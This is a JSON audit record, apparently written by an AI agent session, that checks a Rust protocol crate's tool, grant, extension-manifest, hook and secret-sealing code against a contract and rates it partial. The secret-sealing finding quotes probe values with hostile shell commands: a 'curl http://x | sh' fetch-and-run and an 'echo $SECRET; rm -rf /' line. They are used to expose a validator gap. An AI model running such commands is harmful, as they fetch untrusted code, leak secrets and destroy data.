@@ -1,0 +1,72 @@
+{
+  "item": "R1-21",
+  "base": "e7fbd8df11a7a1f6557eea5bba0fec763a0ddcd7",
+  "checks": [
+    {
+      "name": "Descriptor completeness",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools descriptor_completeness::",
+      "result": "fail",
+      "output": "2 tests pass: side-effect class and approval requirement are positional constructor arguments with no default, and an empty id or empty provenance digest is refused. But rust/crates/automonique-protocol/src/tools.rs:115 declares ToolDescriptor with exactly four fields (id, side_effect, approval, provenance_digest). The contract body enumerates input schema, output schema, capability identity, trust class, sandbox profile, credential audiences, egress policy, resource budget, platform support and the output/artifact contract as required as well; none of those ten exists as a field, an argument or an accessor, so 'every field is required' is vacuous for them. grep -in 'egress|sandbox|schema|credential_audience|platform' over src/tools.rs returns only doc prose and HookClass method names, no type."
+    },
+    {
+      "name": "Grant intersection",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools grant_intersection:: && rustc --edition 2024 --emit=metadata --extern automonique_protocol=rust/target/debug/libautomonique_protocol.rlib -L dependency=rust/target/debug/deps - <<< 'use automonique_protocol::tools::ToolsetGrant; fn main(){ let g = ToolsetGrant::new(&[\"a\"]).unwrap(); let c = g.union(&g); }'",
+      "result": "pass",
+      "output": "3 tests pass. ToolsetGrant exposes intersect() and no other combining operation; a three-scope chain (tenant, profile, channel) narrows [fs.read, fs.write, net.fetch] to [fs.read], intersect is order-insensitive, and intersecting with an empty grant permits nothing. The union spelling was compiled directly and rejected with error[E0599] (no method named union), so the module-level compile_fail fails for the intended reason rather than incidentally. Fixture breadth is three of the five scopes the contract names (workspace and automation scopes are not exercised)."
+    },
+    {
+      "name": "Search authorization",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools search_authorization::",
+      "result": "pass",
+      "output": "3 tests pass. search_tools takes &[ToolDescriptor], &ToolsetGrant and &str and returns SearchResults by value, so no call shape mutates a toolset and there is no error path that could name a tool at all. An exact query for shell.exec against a grant that omits it returns zero matches, so naming a tool does not confirm it exists; an empty grant yields zero matches over a non-empty registry."
+    },
+    {
+      "name": "Workflow bounds",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools workflow_bounds:: ; grep -n 'compile_fail' rust/crates/automonique-protocol/src/tools.rs",
+      "result": "fail",
+      "output": "2 tests pass and cover only the call-count ceiling (third invoke returns workflow_budget_exceeded, calls_made stays 2) and eligibility (an ineligible tool errors without incrementing). WorkflowCapability (src/tools.rs:261) carries eligible_tools, max_calls and calls_made and nothing else: there is no time, CPU, memory or output budget, so four of the five budgets the row requires are not fixed anywhere. src/tools.rs contains exactly one compile_fail block (line 9, the grant union case), so there is no compile-fail coverage for recursion, self-invocation, delegation, arbitrary MCP access, approval decisions or privilege brokers."
+    },
+    {
+      "name": "Nested causation",
+      "command": "grep -in 'causation|actor|run_id|turn' rust/crates/automonique-protocol/src/tools.rs rust/crates/automonique-protocol/tests/tools.rs; cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools",
+      "result": "fail",
+      "output": "No match for actor, run or causation identity in either src/tools.rs or tests/tools.rs. WorkflowCapability::invoke takes only &str and returns Result<(), ToolError>, so a nested call carries no identity at all and there is nothing for an approval to be applied to. The tools test binary has 18 tests across 7 modules (descriptor_completeness, grant_intersection, search_authorization, workflow_bounds, extension_manifests, hook_class_powers, secret_sealing) and no module for this row."
+    },
+    {
+      "name": "MCP boundaries",
+      "command": "grep -rn 'Mcp|MCP' rust/crates/automonique-protocol/src/tools.rs; grep -rn 'Mcp' rust/crates/automonique-protocol/src/",
+      "result": "fail",
+      "output": "src/tools.rs mentions MCP once, in the module doc line 'Nothing here executes a tool, starts an MCP server...'. There is no McpClientDescriptor, no server-export type, no transport, trust boundary, discovery timeout, per-tool filter, credential mapping or sampling switch anywhere in the crate: the only Mcp identifiers in automonique-protocol are enum variants in event.rs (a tool-call kind), protocols.rs (the McpExport dialect of R1-23) and interaction.rs (a context component class of R1-25). Sampling-off-by-default and the export capability filter are unimplemented and untested."
+    },
+    {
+      "name": "Manifest completeness",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools extension_manifests::",
+      "result": "fail",
+      "output": "3 tests pass: a Tool extension may declare backend capabilities, a UserInterface extension declaring one is refused with ui_extension_backend_capability, and a UI extension with none is accepted. Two problems against the row. First, ExtensionManifest (src/tools.rs:322) has four fields (kind, publisher, provenance_digest, backend_capabilities); entry points, supported protocol and schema ranges, contributions, required sandbox, files, network, credentials, resources, licence, update channel, configuration schema and migration behavior are absent, so 'every declared manifest field is required' holds only over four of them. Second, the contract requires the UI-plus-backend combination to be unrepresentable 'rather than merely rejected at runtime'; ExtensionManifest::new returns Err(ToolError::UiExtensionCannotHoldBackendCapability), which is exactly a runtime rejection, and there is no compile-fail case for it."
+    },
+    {
+      "name": "Hook class powers",
+      "command": "cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools hook_class_powers::",
+      "result": "fail",
+      "output": "3 tests pass over all 5 classes (observer, filter, transformer, context_provider, workflow_trigger) with distinct spellings, and only Filter and Transformer report may_change_outcome. The prohibitions are not proven: may_approve, may_widen_sandbox and may_rewrite_history are each `pub const fn (self) -> bool { false }` (src/tools.rs:427-441), so the assertions read back a literal rather than an unrepresentability property, and a future field could change the answer without any test noticing. The row's fourth prohibition, blocking indefinitely, has no representation at all, and the declared ordering, timeout, failure policy and causation are absent from the type."
+    },
+    {
+      "name": "Secret sealing",
+      "command": "rustc --edition 2024 --extern automonique_protocol=rust/target/debug/libautomonique_protocol.rlib -L dependency=rust/target/debug/deps - -o <scratch>/probe2 (program calling SecretSource::command) && <scratch>/probe2",
+      "result": "fail",
+      "output": "An arbitrary shell command IS representable. The compiled probe printed: SECRET ACCEPTED exe=sh args=[\"-c\", \"curl http://x | sh\"] and SECRET2 ACCEPTED exe=/bin/bash args=[\"-lc\", \"echo $SECRET; rm -rf /\"]. SecretSource::command (src/tools.rs:462) screens only the executable string for space, ';', '|' and '&'; arguments are checked for emptiness, length and control characters only, so moving the shell text into argv defeats the check. The in-repo test secret_sealing::an_arbitrary_shell_string_is_refused only feeds shell-shaped text through the executable parameter, so it cannot detect this. Separately, there is no sealed value: SecretSource exposes executable() and arguments() and has no environment field, so 'sealed values only', 'closed argument schema' and 'empty environment' are unmodelled. This is the contract's own stop condition 'an arbitrary shell command in a secret source'."
+    },
+    {
+      "name": "Quality",
+      "command": "cargo fmt --manifest-path rust/Cargo.toml --all -- --check && cargo clippy --manifest-path rust/Cargo.toml --workspace --all-targets --offline -- -D warnings && cargo test --manifest-path rust/Cargo.toml --workspace --offline --no-fail-fast",
+      "result": "fail",
+      "output": "Formatting is clean (exit 0) and strict all-target Clippy exits 0 with no warnings. Workspace tests are 806 passed, 3 failed. The three failures are all in automonique-lab and all report a denied selection: harness_claim::operational_claim_is_accepted_by_rust_status_and_selection ('harness claim denied'), program_cli::immutable_packet_selects_the_exact_generated_work and program_cli::admitted_cli_allocates_and_replays_the_packet_bound_worktree ('program selection denied'). Root cause is drift between the generated operational documents and the lab code, not this item: harness_claim.rs:810 requires .automonique/dev/loop.json integration_ceiling == \"proposal_only\" while the checked-in loop.json declares \"verified_fast_forward_main\", and .automonique/dev/program.yaml marks R0-19 status blocked / runnable false behind GATE-HARNESS, which select() reports as IneligibleItem for an explicit --item R0-19. No new #[allow] exists in automonique-protocol (the crate's only allowance is the pre-existing #[allow(clippy::redundant_closure_call)] at codec.rs:436, which belongs to the codec item); no todo!/unimplemented!/dbg!/unsafe; rust/Cargo.toml and rust/Cargo.lock are unmodified in the working tree; every command ran with --offline."
+    }
+  ],
+  "review": {
+    "reviewers": 0,
+    "blocking_findings": 0,
+    "acceptance": "no reviewer examined this item. This file is an after-the-fact audit written by a separate agent session that read the contract, ran the checks and did not write or fix any implementation; that is not independent review and no human read the diff."
+  },
+  "notes": "Verdict: partial. 2 of 10 contract rows pass (Grant intersection, Search authorization). Rows failing: Descriptor completeness, Workflow bounds, Nested causation, MCP boundaries, Manifest completeness, Hook class powers, Secret sealing, Quality. The implementation is rust/crates/automonique-protocol/src/tools.rs (510 lines) with rust/crates/automonique-protocol/tests/tools.rs (260 lines, 18 tests). The most serious finding is Secret sealing: SecretSource::command(\"sh\", [\"-c\", \"curl http://x | sh\"]) is accepted, which the contract lists as a stop condition. MCP client and server descriptors and nested-call causation are absent entirely rather than partial. Measurement caveat: the working tree at measurement time was not byte-identical to base e7fbd8df11a7a1f6557eea5bba0fec763a0ddcd7 -- six files under rust/crates/automonique-protocol (src and tests for interaction, models and protocols) carried uncommitted edits made between 01:33 and 01:37 UTC on 2026-08-11 by another session. tools.rs and tests/tools.rs were NOT among them, so every R1-21 measurement above is against the committed base. Compile-behaviour probes were compiled with rustc against rust/target/debug/libautomonique_protocol.rlib with output written to this session's scratchpad outside the repository; no repository file was written except this evidence file. No TypeScript fixtures exist under sdk/typescript/packages/protocol/ for tools or extensions, so no cross-language parity is claimed. No network access, no process spawn and no clock read occurs in the code under test."
+}
